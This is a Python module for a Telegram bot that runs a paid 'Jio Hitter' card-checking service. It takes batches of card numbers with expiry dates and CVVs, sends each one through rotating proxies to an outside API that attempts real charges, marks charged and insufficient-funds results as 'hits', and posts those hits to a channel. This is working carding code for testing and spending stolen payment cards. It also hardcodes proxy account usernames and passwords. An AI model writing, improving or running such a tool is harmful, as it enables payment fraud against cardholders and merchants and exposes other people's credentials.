import re
import random
import time
import logging
import asyncio
import html
from urllib.parse import quote
from typing import List, Dict, Optional, Any, Tuple

import aiohttp
from aiogram import Router, F, types, Bot
from aiogram.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiogram.exceptions import TelegramBadRequest

from database import get_user_credits, update_credits, create_user, is_owner_user
from sub import get_premium_status

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ROUTER & CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

router = Router()
logger = logging.getLogger(__name__)

JIO_SESSIONS: Dict[int, Dict[str, Any]] = {}
MAX_CARDS = 10
RESULTS_PER_PAGE = 10
UPDATE_EVERY = 1
PARALLEL_LIMIT = 1
HIT_CHANNEL_ID = -1003912886127
BOT = "https://t.me/CHKXWZ_BOT"

API_URL = "https://doom1.up.railway.app/check"

FREE_USE_LIMIT = 3
FREE_USAGE: Dict[int, int] = {}

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# CUSTOM EMOJI IDs
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

EMOJI_CHARGED = "5427168083074628963"      # ✅ Payment successful
EMOJI_INSUFFICIENT = "6100515480735321747" # ❌ Insufficient funds
EMOJI_DECLINED = "5273914604752216432"     # ❌ Declined
EMOJI_STOP = "6100541628496219252"         # 🛑 Stop

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# PROXY CONFIGURATION
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

PROXIES = [
    "http://purevpn0s551451:9dpdlc2nfxgj@px040805.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px121102.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px121101.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px440401.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px016104.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px180801.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px121001.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px150902.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px270401.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px591203.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px591201.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px152201.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px241104.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px241102.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px400408.pointtoserver.com:10780",
    "http://purevpn0s551451:9dpdlc2nfxgj@px1260303.pointtoserver.com:10780",
    "http://reseller3270s320237:7Grp9Gki@px023005.pointtoserver.com:10780"
]

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# USAGE TEXT
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

ALLOWED_AMOUNTS = {
    "19", "29", "49", "69", "98",
    "129", "155", "199", "219", "239",
    "299", "349", "399", "449", "499",
    "599", "719", "839", "999", "1499",
}

USAGE_TEXT = (
    "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Usage: /jio &lt;phone&gt; &lt;amount&gt; &lt;card&gt;</b>\n\n"
    "<b>Available Amounts:</b>\n"
    "Small ➺ 19 • 29 • 49 • 69 • 98\n"
    "Low ➺ 129 • 155 • 199 • 219 • 239\n"
    "Medium ➺ 299 • 349 • 399 • 449 • 499\n"
    "High ➺ 599 • 719 • 839 • 999 • 1499"
)

# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# RESPONSE MAPPING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# Priority is given to the API `response` field (it is the
# authoritative status). Real-response text is only used as a
# fallback when the `response` field does not clearly match.

RESP_OK_KEYWORDS = (
    "approved", "success", "successful", "charged", "captured",
    "succeeded", "paid", "order_paid", "processed", "payment_success",
)
REAL_OK_KEYWORDS = (
    "payment successful", "payment succeeded", "payment completed",
    "approved", "successfully processed", "charged successfully",
    "order has been paid", "payment was successful", "processed successfully",
)

INSUFFICIENT_KEYWORDS = (
    "insufficient", "insufficient_funds", "insufficient_funds",
    "not enough balance", "no enough balance", "low balance",
    "insufficient balance", "no balance", "unauthorized_transaction",
)

THREED_KEYWORDS = (
    "3ds", "3d secure", "3d_secure", "authentication", "auth_required",
    "require_action", "requires_action", "challenge", "captcha", "otp",
    "redirect", "verification required", "confirm the payment",
    "confirm your card", "card blocked from 3ds", "frictionless",
)

DECLINED_KEYWORDS = (
    "declined", "decline", "rejected", "do_not_honor", "do not honor",
    "not approved", "couldn't approve", "couldnt approve", "could not approve",
    "fraud", "expired", "invalid", "refused", "unable", "could not",
    "card_error", "generic_decline", "processing_error", "lost_card",
    "stolen_card", "call_issuer", "pickup_card", "not supported",
    "your card provider declined", "bank declined", "cannot be used",
)


def _contains(text: str, keywords: Tuple[str, ...]) -> bool:
    return any(k in text for k in keywords)


def map_jio_status(raw_response: str, real_response: str) -> Tuple[str, bool, str, str]:
    """Map API response -> (status, is_hit, emoji_id, short_display)."""
    resp = (raw_response or "").lower()
    real = (real_response or "").lower()

    # 1) Charged / approved — response field has majority
    if _contains(resp, RESP_OK_KEYWORDS) or _contains(real, REAL_OK_KEYWORDS):
        return "approved", True, EMOJI_CHARGED, "Payment Successful."

    # 2) Insufficient funds
    if _contains(resp, INSUFFICIENT_KEYWORDS) or _contains(real, INSUFFICIENT_KEYWORDS):
        return "approved", True, EMOJI_INSUFFICIENT, "Your card does not have enough balance."

    # 3) 3DS challenge
    if _contains(resp, THREED_KEYWORDS) or _contains(real, THREED_KEYWORDS):
        return "3ds", False, EMOJI_DECLINED, "3DS Required."

    # 4) Declined / rejected by issuer
    if _contains(resp, DECLINED_KEYWORDS) or _contains(real, DECLINED_KEYWORDS):
        return "declined", False, EMOJI_DECLINED, "Payment Declined By Issuer."

    # 5) Unknown — surface whatever the API said
    return "declined", False, EMOJI_DECLINED, str(real_response or raw_response or "Unknown Response")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# HELPERS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def format_proxy_for_api(proxy: str) -> str:
    """Convert 'http://user:pass@host:port' -> 'host:port:user:pass'."""
    raw = proxy
    if raw.startswith("http://"):
        raw = raw[len("http://"):]
    elif raw.startswith("https://"):
        raw = raw[len("https://"):]
    if "@" in raw:
        userinfo, hostport = raw.split("@", 1)
        user, _, pwd = userinfo.partition(":")
        host, _, port = hostport.rpartition(":")
        return f"{host}:{port}:{user}:{pwd}"
    return raw


def build_api_url(number: str, amount: str, card: str, proxy_fmt: str) -> str:
    return (
        f"{API_URL}?cc={quote(card)}"
        f"&number={quote(number)}"
        f"&proxy={quote(proxy_fmt)}"
        f"&amount={quote(str(amount))}"
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# API PROCESSING
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def process_jio_card(number: str, amount: str, card: str) -> Dict[str, Any]:
    """Call the Jio check API for a single card. Returns a result dict."""
    data = None
    last_error = None

    for attempt in range(3):
        proxy_fmt = format_proxy_for_api(random.choice(PROXIES))
        url = build_api_url(number, amount, card, proxy_fmt)

        try:
            connector = aiohttp.TCPConnector(ssl=False)
            timeout = aiohttp.ClientTimeout(total=120, connect=10)
            async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
                async with session.get(url) as resp:
                    if resp.status != 200:
                        last_error = f"API Error: HTTP {resp.status}"
                        if attempt < 2:
                            await asyncio.sleep(0.5)
                            continue
                        break
                    try:
                        data = await resp.json(content_type=None)
                    except Exception:
                        last_error = "Invalid API Response"
                    break
        except (aiohttp.ClientError, asyncio.TimeoutError) as e:
            last_error = f"Connection Error: {e}"
            if attempt < 2:
                await asyncio.sleep(0.5)
                continue
            break
        except Exception as e:
            last_error = f"Connection Error: {e}"
            break

    if data is None:
        return {
            "card": card,
            "resp": "error",
            "status": "error",
            "display": last_error or "Unknown Error",
            "emoji": EMOJI_DECLINED,
            "price": f"{amount} INR",
            "gateway": "jio",
            "is_hit": False,
        }

    raw_response = str(data.get("response", ""))
    real_response = data.get("real-response") or raw_response or "Unknown"
    price = data.get("price") or f"{amount} INR"
    gateway = data.get("gateway") or "jio"

    status, is_hit, emoji, display = map_jio_status(raw_response, real_response)

    return {
        "card": card,
        "resp": raw_response,
        "status": status,
        "display": display,
        "emoji": emoji,
        "price": str(price),
        "gateway": str(gateway),
        "is_hit": is_hit,
    }


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# SEND HIT MESSAGE
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def send_hit_message(bot: Bot, response_type: str, amount: str, gateway: str,
                           user_name: str, user_id: int, emoji_id: str = None):
    """Sends the Hit Detect message to the channel."""
    try:
        user_link = f"<a href='tg://user?id={user_id}'>{html.escape(user_name)}</a>"

        if emoji_id:
            emoji_part = f'<tg-emoji emoji-id="{emoji_id}">🔥</tg-emoji>'
        else:
            emoji_part = "🔥"

        hit_msg = (
            f"<b><a href='https://t.me/broken_wiz'>[  ɧ ι 𝛕  ]</a></b> "
            f"<b>➺ Jɪᴏ Hɪᴛᴛᴇʀ [{html.escape(gateway)}]</b> {emoji_part}\n"
            f"<b>Aᴍᴏᴜɴᴛ ➺ {html.escape(amount)}</b>\n"
            f"<b>Rᴀᴡ ➺</b> <code>{html.escape(response_type)}</code>\n"
            f"<b>Usᴇʀ ➺ {user_link}</b>"
        )

        reply_markup = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="𝘾𝙃𝙆 𝕏 [𝙒 𝙄 𝙕] ", url=BOT, style="primary",
             icon_custom_emoji_id="5445104308884370368")]
        ])

        await bot.send_message(
            chat_id=HIT_CHANNEL_ID,
            text=hit_msg,
            parse_mode="HTML",
            reply_markup=reply_markup,
            disable_web_page_preview=True
        )
    except Exception as e:
        logger.error(f"Failed to send hit message: {e}")


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# COMMAND HANDLER
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

@router.message(F.text.startswith("/jio"))
async def jio_command(message: types.Message):
    user_id = message.from_user.id
    user_name = message.from_user.first_name or "User"
    username = message.from_user.username

    # ── Paid gate: free users limited to FREE_USE_LIMIT runs ────────────────
    is_premium, _ = await asyncio.to_thread(get_premium_status, user_id)
    if not is_premium:
        used = FREE_USAGE.get(user_id, 0)
        if used >= FREE_USE_LIMIT:
            await message.reply(
                "<tg-emoji emoji-id=\"5447381715293074599\">⚠️</tg-emoji> <b>Fʀᴇᴇ Lɪᴍɪᴛ Rᴇᴀᴄʜᴇᴅ!</b>\n\n"
                f"Free users can use <b>Jɪᴏ Hɪᴛᴛᴇʀ</b> only <b>{FREE_USE_LIMIT}</b> times.\n"
                "💎 <b>Usᴇ /plan Tᴏ Uᴘɢʀᴀᴅᴇ Aɴᴅ Gᴇᴛ Uɴʟɪᴍɪᴛᴇᴅ Aᴄᴄᴇss.</b>",
                parse_mode="HTML"
            )
            return

    # 1. Manual parsing: /jio {number} {amount} {cards inline}
    text_content = message.text or ""
    parts = text_content.split()

    if len(parts) < 3:
        await message.reply(USAGE_TEXT, parse_mode="HTML")
        return

    number = parts[1].strip()
    amount = parts[2].strip()
    raw_cards = parts[3:]

    # Or fetch cards from reply
    if message.reply_to_message:
        replied_text = message.reply_to_message.text or message.reply_to_message.caption or ""
        raw_cards.extend(replied_text.split('\n'))

    # 2. Validate phone number & amount
    if not re.fullmatch(r"\d{7,15}", number):
        await message.reply(USAGE_TEXT, parse_mode="HTML")
        return

    if amount not in ALLOWED_AMOUNTS:
        await message.reply(USAGE_TEXT, parse_mode="HTML")
        return

    # 3. Extract Cards with Regex
    card_pattern = re.compile(r'(\d{13,19})[\|/:\s]+(\d{1,2})[\|/:\s]+(\d{2,4})[\|/:\s]+(\d{3,4})')

    valid_cards = []
    seen = set()

    for item in raw_cards:
        match = card_pattern.search(item)
        if match:
            cc, mm, yy, cvv = match.groups()
            mm = mm.zfill(2)
            if len(yy) == 4:
                yy = yy[2:]
            formatted = f"{cc}|{mm}|{yy}|{cvv}"
            if formatted not in seen:
                seen.add(formatted)
                valid_cards.append(formatted)

    # 4. Limits Check
    if len(valid_cards) > MAX_CARDS:
        await message.reply(
            f"<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Limit Exceeded!</b>\n\nMax allowed: {MAX_CARDS}",
            parse_mode="HTML"
        )
        return

    if not valid_cards:
        await message.reply("⚠️ No valid cards found.", parse_mode="HTML")
        return

    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    # CREDIT DEDUCTION LOGIC
    # ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

    try:
        await asyncio.to_thread(create_user, user_id, username)
        current_credits = await asyncio.to_thread(get_user_credits, user_id)

        if not is_owner_user(user_id) and (current_credits is None or current_credits < 1):
            await message.reply(
                "<tg-emoji emoji-id=\"4956612582816351459\">❌</tg-emoji> <b>Iɴsᴜғғɪᴄɪᴇɴᴛ Cʀᴇᴅɪᴛs</b>\n\n"
                "Yᴏᴜ Nᴇᴇᴅ Aᴛ Lᴇᴀsᴛ <b>1 Cʀᴇᴅɪᴛ</b> Tᴏ Usᴇ Tʜɪs Gᴀᴛᴇ.\n"
                "Usᴇ /plan Tᴏ Gᴇᴛ Mᴏʀᴇ.",
                parse_mode="HTML"
            )
            return

        new_balance = current_credits - 1
        await asyncio.to_thread(update_credits, user_id, new_balance)

        logger.info(f"[JIO] User {user_id} deducted 1 credit. Old: {current_credits} -> New: {new_balance}")

    except Exception as e:
        logger.error(f"Failed to process credits for user {user_id}: {e}")
        await message.reply("⚠️ <b>Database Error.</b>\nCould not verify credits. Please try again.", parse_mode="HTML")
        return

    # ── Count free usage only when a session actually launches ──────────────
    if not is_premium:
        FREE_USAGE[user_id] = FREE_USAGE.get(user_id, 0) + 1

    # 5. Start Async Task
    asyncio.create_task(
        run_jio_check(message, number, amount, valid_cards, user_name, user_id)
    )


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# ASYNC MASS CHECKER & UI LOGIC
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

async def run_jio_check(message: types.Message, number: str, amount: str, cards: List[str],
                        user_name: str, user_id: int):
    start_time = time.time()
    total_cards = len(cards)
    bot = message.bot

    # Initial Status Message
    status_msg = await message.reply(
        f"<b>Gᴀᴛᴇ ➺ Jɪᴏ Hɪᴛᴛᴇʀ [jio]</b>\n"
        f"<b>Pʀᴏɢʀᴇss ➺ 0/{total_cards}</b>\n"
        f"<b>Aᴍᴏᴜɴᴛ ➺ {amount} INR</b>\n"
        f"<b>Sᴛᴀᴛᴜs ➺ Hɪᴛᴛɪɴɢ…</b>\n"
        f"━━━━━━━━━━━━━━━━",
        parse_mode="HTML", disable_web_page_preview=True
    )
    msg_id = status_msg.message_id

    # Initialize Session State
    JIO_SESSIONS[msg_id] = {
        "results": [],
        "page": 0,
        "total_cards": total_cards,
        "start_time": start_time,
        "user_name": user_name,
        "user_id": user_id,
        "msg_id": msg_id,
        "amount": f"{amount} INR",
        "gateway": "jio",
        "final_status": "checking",
        "current_card": None,
        "stopped": False,
        "tasks": []
    }

    # Semaphore to limit parallel processing
    sem = asyncio.Semaphore(PARALLEL_LIMIT)

    async def worker(card_str: str):
        async with sem:
            # ── Show this card as "Pʀᴏᴄᴇssɪɴɢ…" immediately ──────────────
            JIO_SESSIONS[msg_id]["current_card"] = card_str
            try:
                _elapsed = round(time.time() - start_time, 2)
                _text = format_page_content(JIO_SESSIONS[msg_id], _elapsed, is_working=True)
                await status_msg.edit_text(_text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
            except Exception:
                pass

            try:
                res = await process_jio_card(number, amount, card_str)

                # Update amount + gateway display
                JIO_SESSIONS[msg_id]["amount"] = res.get("price") or JIO_SESSIONS[msg_id].get("amount")
                JIO_SESSIONS[msg_id]["gateway"] = res.get("gateway") or JIO_SESSIONS[msg_id].get("gateway", "jio")

                is_hit = res.get("is_hit", False)
                emoji = res["emoji"]

                # Send hit messages (successful payments and insufficient funds)
                if is_hit:
                    asyncio.create_task(
                        send_hit_message(
                            bot,
                            res["display"],
                            JIO_SESSIONS[msg_id]["amount"],
                            res.get("gateway") or "jio",
                            user_name,
                            user_id,
                            emoji
                        )
                    )

                result = {
                    "card": card_str,
                    "resp": res["resp"],
                    "status": "approved" if is_hit else "declined",
                    "display": res["display"],
                    "emoji": emoji
                }

            except Exception as e:
                logger.error(f"Worker error: {e}")
                result = {
                    "card": card_str,
                    "resp": "script_error",
                    "status": "error",
                    "display": str(e),
                    "emoji": EMOJI_DECLINED
                }

            # ── Clear "Pʀᴏᴄᴇssɪɴɢ…" — card is done ────────────────────────
            JIO_SESSIONS[msg_id]["current_card"] = None
            return result

    # Create tasks
    tasks = [asyncio.create_task(worker(cc)) for cc in cards]
    JIO_SESSIONS[msg_id]["tasks"] = tasks

    results = []
    pending = set(tasks)
    paid_found = False

    # Process tasks as they complete
    while pending:
        done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)

        for task in done:
            if task.cancelled():
                continue
            try:
                res = task.result()
                results.append(res)
                # Stop immediately when Payment Successful is detected
                if res.get('emoji') == EMOJI_CHARGED:
                    paid_found = True
            except Exception as e:
                logger.error(f"Worker task error: {e}")

        # Cancel all remaining tasks if a paid result was found
        if paid_found:
            for t in pending:
                t.cancel()
            pending = set()

        # Sort: Hits first, then 3DS, then others
        results.sort(key=lambda x: (
            0 if x['emoji'] == EMOJI_CHARGED else 1 if x['emoji'] == EMOJI_INSUFFICIENT else 2
        ))

        # Update UI periodically
        if len(results) % UPDATE_EVERY == 0 or not pending:
            elapsed = round(time.time() - start_time, 2)
            JIO_SESSIONS[msg_id]["results"] = results
            JIO_SESSIONS[msg_id]["elapsed_final"] = elapsed

            still_working = bool(pending) and not JIO_SESSIONS[msg_id].get("stopped")
            text = format_page_content(JIO_SESSIONS[msg_id], elapsed, is_working=still_working)

            try:
                await status_msg.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
            except TelegramBadRequest:
                pass
            except Exception as e:
                logger.error(f"UI Update error: {e}")

    # Finalize
    elapsed_final = round(time.time() - start_time, 2)
    JIO_SESSIONS[msg_id]["elapsed_final"] = elapsed_final
    JIO_SESSIONS[msg_id]["final_status"] = (
        "stopped" if JIO_SESSIONS[msg_id].get("stopped") else "completed"
    )

    final_text = format_page_content(JIO_SESSIONS[msg_id], elapsed_final, is_working=False)

    try:
        await status_msg.edit_text(final_text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
    except TelegramBadRequest:
        pass


# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
# FORMATTING & CALLBACKS
# ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

def format_page_content(state: Dict[str, Any], elapsed: float, is_working: bool) -> str:
    results = state["results"]
    page = state["page"]
    start_idx = page * RESULTS_PER_PAGE
    page_results = results[start_idx : start_idx + RESULTS_PER_PAGE]

    amount = state.get('amount', 'N/A')
    gateway = state.get('gateway', 'jio')
    total_cards = state['total_cards']
    progress = f"{len(results)}/{total_cards}"

    # Determine overall session status
    has_paid = any(r.get('emoji') == EMOJI_CHARGED for r in results)
    if has_paid:
        status_text = f'Pᴀɪᴅ <tg-emoji emoji-id="{EMOJI_CHARGED}">✅</tg-emoji>'
    elif is_working:
        status_text = 'Hɪᴛᴛɪɴɢ…<tg-emoji emoji-id=\"6154603635981423575\">⏳</tg-emoji>'
    elif state.get('stopped') or state.get('final_status') == 'stopped':
        status_text = f'Sᴛᴏᴘᴘᴇᴅ <tg-emoji emoji-id="{EMOJI_STOP}">🛑</tg-emoji>'
    else:
        status_text = f'Nᴏᴛ Pᴀɪᴅ <tg-emoji emoji-id="{EMOJI_DECLINED}">❌</tg-emoji>'

    text = (
        f"<b>Gᴀᴛᴇ ➺ Jɪᴏ Hɪᴛᴛᴇʀ [{html.escape(str(gateway))}]</b>\n"
        f"<b>Pʀᴏɢʀᴇss ➺ {progress}</b>\n"
        f"<b>Aᴍᴏᴜɴᴛ ➺ {html.escape(amount)}</b>\n"
        f"<b>Sᴛᴀᴛᴜs ➺ {status_text}</b>\n"
        f"━━━━━━━━━━━━━━━━"
    )

    for res in page_results:
        display = res.get('display', 'Unknown')
        emoji = res.get('emoji', EMOJI_DECLINED)

        text += (
            f"\n<code>{res['card']}</code>"
            f"\n<b>{html.escape(display)}</b> <tg-emoji emoji-id=\"{emoji}\">❌</tg-emoji>"
            f"\n━━━━━━━━━━━━━━━━"
        )

    # Show the card currently being hit with "Pʀᴏᴄᴇssɪɴɢ…"
    current_card = state.get('current_card')
    if is_working and current_card:
        text += (
            f"\n<code>{current_card}</code>"
            f"\n<b>Pʀᴏᴄᴇssɪɴɢ…</b><tg-emoji emoji-id=\"6154603635981423575\">⏳</tg-emoji>"
            f"\n━━━━━━━━━━━━━━━━"
        )

    return text


def get_keyboard(msg_id: int) -> Optional[InlineKeyboardMarkup]:
    state = JIO_SESSIONS.get(msg_id)
    if not state:
        return None

    total = len(state["results"])
    pages = (total + RESULTS_PER_PAGE - 1) // RESULTS_PER_PAGE if total else 1
    current = state["page"]

    buttons = []
    row = []

    if current > 0:
        row.append(InlineKeyboardButton(text="Back", callback_data=f"jio_prev_{msg_id}"))
    if current < pages - 1:
        row.append(InlineKeyboardButton(text="Next", callback_data=f"jio_next_{msg_id}"))

    if row:
        buttons.append(row)

    running = state.get("final_status") == "checking" and not state.get("stopped")
    if running:
        buttons.append([
            InlineKeyboardButton(
                text="Stop",
                callback_data=f"jio_stop_{msg_id}",
                style="danger",
                icon_custom_emoji_id=EMOJI_STOP,
            )
        ])

    if not buttons:
        return None

    return InlineKeyboardMarkup(inline_keyboard=buttons)


@router.callback_query(F.data.startswith("jio_"))
async def jio_callback_handler(callback: types.CallbackQuery):
    data = callback.data
    parts = data.split("_")

    if len(parts) < 3:
        await callback.answer("Invalid callback")
        return

    try:
        msg_id = int(parts[2])
    except ValueError:
        await callback.answer("Invalid ID")
        return

    state = JIO_SESSIONS.get(msg_id)
    if not state:
        await callback.answer("Session expired or not found.", show_alert=True)
        return

    if callback.from_user.id != state['user_id']:
        await callback.answer("⛔ Not your session.", show_alert=True)
        return

    action = parts[1]
    total_results = len(state["results"])
    total_pages = (total_results + RESULTS_PER_PAGE - 1) // RESULTS_PER_PAGE

    if action == "stop":
        state["stopped"] = True
        for t in state.get("tasks", []):
            if not t.done():
                t.cancel()
        await callback.answer("🛑 Stopping…", show_alert=False)
        return

    if action == "next" and state['page'] < total_pages - 1:
        state['page'] += 1
    elif action == "prev" and state['page'] > 0:
        state['page'] -= 1

    await callback.answer()

    elapsed = state.get('elapsed_final', round(time.time() - state['start_time'], 2))
    text = format_page_content(state, elapsed, is_working=False)

    try:
        await callback.message.edit_text(text, parse_mode="HTML", reply_markup=get_keyboard(msg_id))
    except TelegramBadRequest:
        pass